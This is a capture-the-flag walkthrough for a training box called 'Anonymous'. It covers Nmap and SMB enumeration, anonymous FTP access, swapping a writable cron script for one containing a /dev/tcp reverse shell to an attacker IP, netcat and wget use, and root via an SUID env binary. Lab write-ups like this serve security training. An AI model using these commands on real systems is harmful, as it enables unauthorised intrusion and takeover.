# Anonymous

> RedAiden

## Enumeration

### Nmap

Lets start with a quick Nmap scan.

`nmap -sV -sC 10.10.149.56`
```
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.125.240
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
MAC Address: 02:60:CC:DC:CB:5F (Unknown)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)                                                                                                                   
|   Computer name: anonymous                                                                                                                               
|   NetBIOS computer name: ANONYMOUS\x00                                                                                                                   
|   Domain name: \x00                                                                                                                                      
|   FQDN: anonymous                                                                                                                                        
|_  System time: 2021-01-04T21:53:26+00:00                                                                                                                 
| smb-security-mode:                                                                                                                                       
|   account_used: guest                                                                                                                                    
|   authentication_level: user                                                                                                                             
|   challenge_response: supported                                                                                                                          
|_  message_signing: disabled (dangerous, but default)                                                                                                     
| smb2-security-mode:                                                                                                                                      
|   2.02:                                                                                                                                                  
|_    Message signing enabled but not required                                                                                                             
| smb2-time:                                                                                                                                               
|   date: 2021-01-04T21:53:26                                                                                                                              
|_  start_date: N/A
```

Questions 1-3 can be answered from the scan alone. For the 4th question we need to list all the shares in the smb service. We can use `smbclient` to do so.

`smbclient -L 10.10.149.56`
```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
****           Disk      My SMB Share Directory for Pics
IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
```
The answer is the middle Sharename.

### Exploring the FTP service
1. Lets connect to the ftp service: `ftp 10.10.x.x` as the user `anonymous`. 
2. When asked for the password just hit enter. 
3. We can do `ls` to discover a directory called `scripts`. 
4. Navigate to it `cd scripts` and do another `ls` to discover three new files.
```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1032 Jan 05 02:47 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
```
5. Download every file with `mget *`so we can read them in our machine.
6. On our machine, read the `clean.sh` script
```
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```
- Looks like it's just cleaning some files and if there are none it adds a log to `removed_files.log`
- If we read the log we can see a bunch of repeated messages, so we can assume it is running as a cron job.
- We know that we can write to the file, so we can abuse that to get a reverse bash shell.


## Exploitation
1. Edit the script to add the [reverse bash shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
```bash
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        bash -i >& /dev/tcp/10.10.187.10/4444 0>&1
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```
- Remeber to change the IP to your machine
2. Start a netcat listener on the assigned port `rlwrap nc -lvnp 4444`
   - `rlwrap` helps with making the shell a bit nicer, but it is not necessary.
3. On the terminal with the ftp connection, upload the file with `put clean.sh clean.sh`
   - We are replacing the old script with a our new one.
4. Wait for the connection to appear on the listener.
5. Once on the shell we can find the user flag in the same directory.
```
namelessone@anonymous:~$ ls
ls
pics
user.txt
```

## Privelege Escalation

We can upload a script to do the recon for us and find a vulnerability to gain higher privileges. In this case I'll use [LinEnum](https://github.com/rebootuser/LinEnum).

1. On your machine, start a python http server in the same directory as your script `python -m SimpleHTTPServer`
2. On the reverse shell, download the script `wget http://10.10.x.x:8000/LinEnum.sh`
3. Make it executable `chmod +x LinEnum.sh`
4. Run the script `./LinEnum.sh`
5. After looking at the results, we can see an SUID marked file `/usr/bin/env`
6. Use [gtfobins](https://gtfobins.github.io/) to search for a vulnerability regarding `env`
7. Looking at gtfobins we see that we can use the SUID to get elevated privileges. Run the following command `/usr/bin/env /bin/sh -p`
8. After running it we should get root. You can double check with `whoami`
9. Change into the directory `/root` to find the flag.